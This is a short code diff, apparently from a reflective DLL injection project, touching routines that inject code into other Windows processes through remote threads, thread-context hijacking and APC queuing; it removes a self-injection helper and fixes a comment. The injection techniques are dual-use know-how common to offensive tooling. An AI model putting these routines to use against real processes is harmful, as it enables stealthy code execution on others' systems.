@@ -178,7 +178,7 @@ DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )
 // Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
 //       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
 // Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
-// Note: This function currently cant inject accross architectures, but only to architectures which are the 
+// Note: This function currently cant inject across architectures, but only to architectures which are the 
 //       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
 
 bool InjectUsingCreateRemoteThread(HANDLE process, LPTHREAD_START_ROUTINE startRoutine, LPVOID parameter)
@@ -272,12 +272,6 @@ const unsigned char shell[] =
 };
 #endif
 
-DWORD WINAPI DummyThreadFn(LPVOID lpThreadParamete)
-{
-    for (;;)
-        SleepEx(10, TRUE);
-}
-
 BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpReflectiveLoader, PVOID lpParameter)
 {
     PDWORD_PTR pdwptr = NULL;
@@ -292,12 +286,6 @@ BOOL InjectUsingSetThreadContext(HANDLE hProcess, LPTHREAD_START_ROUTINE lpRefle
     DWORD targetThreadId = 0;
     HANDLE targetThread = NULL;
     
-    if (processId == GetCurrentProcessId())
-    {
-        CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
-        YieldProcessor();
-    }
-
     hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);;
 
     te32.dwSize = sizeof(te32);
@@ -438,15 +426,6 @@ void APCProcEnd()
 
 bool InjectUsingAPC(HANDLE process, LPTHREAD_START_ROUTINE startRoutine, PVOID parameter, function<bool(PAPCFUNC, HANDLE, ULONG_PTR)> func)
 {
-    const DWORD processId = ::GetProcessId(process);
-    const DWORD currentThreadId = ::GetCurrentThreadId();
-
-    if (processId == ::GetCurrentProcessId())
-    {
-        ::CreateThread(NULL, 0, DummyThreadFn, 0, 0, NULL);
-        ::YieldProcessor();
-    }
-
     auto mem = ::VirtualAllocEx(process, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!mem)
     {
@@ -458,6 +437,9 @@ bool InjectUsingAPC(HANDLE process, LPTHREAD_START_ROUTINE startRoutine, PVOID p
     {
         return false;
     }
+
+    const DWORD processId = ::GetProcessId(process);
+    const DWORD currentThreadId = ::GetCurrentThreadId();
 
     for (auto tid : getProcessThreads(processId))
     {
